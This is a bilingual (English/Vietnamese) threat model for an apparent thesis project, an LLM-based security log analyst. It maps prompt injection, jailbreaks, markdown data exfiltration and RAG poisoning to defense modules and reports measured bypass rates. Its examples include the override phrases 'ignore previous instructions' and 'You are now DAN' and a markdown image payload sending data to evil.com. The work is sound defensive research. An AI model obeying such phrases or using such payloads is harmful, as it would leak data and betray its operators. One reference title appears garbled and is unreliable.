# Threat Model for the Cognitive Two-Tier Architecture

> **Status:** HOÀN THIỆN v2 — Cập nhật phòng thủ 8 Attack Vectors + Long-Term APT Memory (30/04/2026)
> **Mục đích:** Trả lời câu hỏi "Kiến trúc Hai tầng bảo vệ được gì, không bảo vệ được gì?"

---

## 1. Adversary Profiles

| Profile | Capability | Ví dụ | Trong scope? |
|---|---|---|---|
| Script Kiddie | Copy-paste injection strings từ Internet | `"ignore previous instructions"` | ✅ Yes — Encapsulation blocks |
| Skilled Attacker | Biết cấu trúc SENTINEL, craft injection qua log fields | Encoding bypass, delimiter smuggling | ✅ Yes — Encapsulation + Neutralization |
| Jailbreak Attacker | Dùng DAN/Developer Mode/Role-Play để bypass LLM constraints | "You are now DAN" | ✅ Yes — JailbreakDetector |
| Semantic Attacker | Dùng prose tự nhiên, đúng ngữ pháp, không chứa keyword | Xem Section 4 | ⚠️ Measured — Quantified limitation |
| Data Exfiltrator | Chèn markdown/HTML vào log để exfil data qua rendering | `![](https://evil.com/steal?data=X)` | ✅ Yes — OutputSanitizer |
| RAG Poisoner | Sửa đổi Knowledge Base files để thao túng LLM | Tamper mitre_attack.json | ✅ Yes — Integrity verification |
| Insider Threat | SOC analyst bị compromise, có HITL access | Session hijacking, approve malicious rules | ❌ Out of scope |
| APT / Nation-State | Full kill-chain, multiple vectors, long-term persistence | Supply chain, knowledge base poisoning | ⚠️ Partial — Long-Term Memory |

---

## 2. 8 Attack Vectors — Defense Matrix

> **Nguồn:** "How to Hack AI Agents & Applications" — @nahamsec / @cyberkid1987

| # | Attack Vector | Defense Module | Defense Status | Chi tiết |
|---|---|---|:---:|---|
| 01 | **Jailbreaks** | `JailbreakDetector` trong `prompt_filter.py` | ✅ Defended | 15+ patterns (DAN, Developer Mode, Role-Play). Regex role-play detection. |
| 02 | **Prompt Injection** | `PromptInjectionDetector` + `DelimitedDataEncapsulator` | ✅ Defended | 3-Layer: Pattern Detection → Encoding Neutralization → Dynamic Delimiters |
| 03 | **Indirect Injection** | `DelimitedDataEncapsulator` (Dynamic Randomized Delimiters) | ✅ Defended | Log data = DATA trong prompt, không phải INSTRUCTION. Chống Delimiter Smuggling. |
| 04 | **Data Exfil via Markdown** | `OutputSanitizer` trong `output_sanitizer.py` | ✅ Defended | Strip markdown images, HTML tags, data URIs, external links TRƯỚC khi render. |
| 05 | **SSRF via AI Browsing** | N/A | ✅ N/A | SENTINEL không browse web. Agent chỉ nhận log từ Redis, không outbound requests. |
| 06 | **RAG Poisoning** | `verify_document_integrity()` trong `security.py` | ✅ Defended | SHA-256 hash check Knowledge Base trước khi load. Provenance tagging per chunk. |
| 07 | **Sandbox Escape / RCE** | `ActionValidator` trong `executor.py` | ✅ Defended | Allowlist-only actions. Command injection filter. Docker non-root. |
| 08 | **Multi-Modal Injection** | N/A | ✅ N/A | SENTINEL chỉ xử lý text logs, không audio/image/video. |

---

## 3. Attack Surface Analysis

### 3.1 Log Ingestion Path
```
CSV/Syslog → Redis Stream → Tier 1 Rule Engine → Guardrails → LLM Agent
```
- **Attack vector:** Malicious content embedded in log fields (User-Agent, Referer, URI)
- **Defense:** Delimited Data Encapsulation (structural), Pattern Matching (keyword), JailbreakDetector
- **Residual risk:** Semantic Confusion (see Section 4)

### 3.2 RAG Knowledge Base
- **Attack vector:** Knowledge Base Poisoning (modify MITRE/ISO JSON files)
- **Defense:** SHA-256 integrity verification (`checksums.sha256`), provenance tagging, read-only Docker mount
- **Residual risk:** Insider with filesystem access could update both KB and checksums simultaneously

### 3.3 LLM Output Path (NEW)
- **Attack vector:** Data Exfiltration via Markdown rendering on Dashboard
- **Defense:** `OutputSanitizer` strips markdown images, HTML tags, data URIs BEFORE render
- **Residual risk:** Novel exfil vectors not covered by regex patterns

### 3.4 HITL Dashboard
- **Attack vector:** Session hijacking, CSRF, unauthorized rule approval
- **Defense:** RBAC (L1/L3 roles), session timeout
- **Residual risk:** Out of scope for this thesis

### 3.5 Action Execution Path (HARDENED)
- **Attack vector:** LLM hallucinate → generate shell command → RCE
- **Defense:** `ActionValidator` — allowlist-only actions, command injection filter on all inputs
- **Residual risk:** If allowlist is expanded without review

### 3.6 Feedback Loop
- **Attack vector:** Agent hallucinate → generate overly broad blocking rule → DoS legitimate traffic
- **Defense:** HITL Quarantine (all rules require L3 Manager approval)
- **Residual risk:** L3 Manager rubber-stamping (human factor, out of scope)

### 3.7 Evaluation Bias (The 3-Model Ecosystem)
- **Attack vector:** Self-Enhancement Bias
- **Defense:** 3 Models: `all-MiniLM-L6-v2` (RAG), `Gemma 9B` (Agent), `Llama 3 8B` (Judge)
- **Residual risk:** Shared RLHF alignment bias

---

## 4. Defense Effectiveness Matrix

> **Bảng TRỌNG TÂM** — Mỗi ô có số liệu thực nghiệm từ 45 adversarial samples (18/04/2026).

| Attack Type | Defense Layer | Samples | Blocked | Defeat Rate | Source |
|---|---|---|---|---|---|
| Delimiter Smuggling | L3: Dynamic Randomized Delimiters | 4 | 4 | **100%** | `structural_attacks/` |
| Structural Injection (JSON/XML/Role) | L1 Pattern + L2 Encoding + L3 Delimiter | 15 | 14 | **93.3%** | `structural_attacks/` |
| Encoding Bypass (Base64/Unicode/HTML) | L2: Encoding Neutralization | 15 | 8 | **53.3%** | `encoding_bypass/` |
| **Semantic Confusion** | **Không có defense hiệu quả** | **15** | **2** | **13.3%** | `semantic_confusion/` |
| **TỔNG** | **3-Layer Pipeline** | **45** | **24** | **53.3%** | `robustness_results.json` |

---

## 5. Long-Term APT Memory (NEW)

### 5.1 Vấn đề
Session Memory (RAM) bị mất khi restart → không thể phát hiện APT low-and-slow kéo dài nhiều ngày.

### 5.2 Giải pháp: ThreatMemoryStore
- **Persistent Store:** SQLite (`config/threat_memory.db`)
- **3 Chức năng:**

| Chức năng | Table | Mục đích |
|---|---|---|
| IP Reputation | `ip_reputation` | Theo dõi hành vi IP qua nhiều session. Auto-score dựa trên severity. |
| Organizational Context | `known_entities` | Nhận diện traffic hợp pháp nội bộ (Nessus, Qualys, pentest IPs) |
| APT Correlation | `apt_indicators` | Flag IP bị escalate > N lần trong M ngày |

### 5.3 Integration Flow
```
Tier 2 nhận batch mới
    │
    ▼
Query ThreatMemoryStore cho source IPs
    │
    ├─ Known Entity? → Inject "LEGITIMATE" context vào prompt
    ├─ High Reputation Score? → Inject "HIGH RISK" context
    └─ APT Candidate? → Inject "ESCALATE SEVERITY" context
    │
    ▼
LLM phân tích với Long-Term Context
    │
    ▼
Ghi kết quả ngược vào ThreatMemoryStore
```

---

## 6. Semantic Confusion — Quantified Open Limitation

### 6.1 Definition
Semantic Confusion: Kẻ tấn công nhúng ý đồ độc hại vào đoạn văn đúng ngữ pháp.

### 6.2 Kết quả
| Metric | Giá trị | Ghi chú |
|---|---|---|
| Semantic Confusion Bypass Rate | **86.7%** (13/15 samples) | Encapsulation không chặn semantic |
| Pattern Detection trên Semantic | 0/15 | Không keyword injection nào |

### 6.3 Future Work
- Semantic Firewall (Output Classifier)
- Chain-of-Thought verification
- Fine-tune LLM cho domain Security

---

## 7. Scope Boundaries

SENTINEL **KHÔNG** claim:
- [ ] Thay thế WAF / Firewall vật lý
- [ ] Chống DDoS Layer 3/4
- [ ] Bảo vệ khỏi insider threat ở tầng HITL
- [ ] Chống supply chain attack vào knowledge base
- [ ] Giải quyết hoàn toàn Semantic Confusion (measured, not solved)

---

## References

1. Oniagbi, G. et al. (2024). "LLM-based Intrusion Detection: Challenges of Data Privacy in Cloud Environments." *IEEE Access*.
2. OWASP (2025). "OWASP Top 10 for LLM Applications." owasp.org/www-project-top-10-for-large-language-model-applications.
3. Perez, F. & Ribeiro, I. (2022). "Ignore This Title and HackAPrompt: Evaluating Prompt Injection in Large Language Models." *arXiv:2211.09527*.
4. Cisco Talos (2025). "Adversarial Machine Learning Threats to AI-powered Security Systems." Cisco Talos Intelligence.
5. Sharafaldin, I. et al. (2018). "Toward Generating a New Intrusion Detection Dataset and Intrusion Traffic Characterization." *ICISSP*.
6. Zhang, H. et al. (ICLR 2025). "Agent Security Bench: Formalizing and Benchmarking Attacks and Defenses in LLM-based Agents."

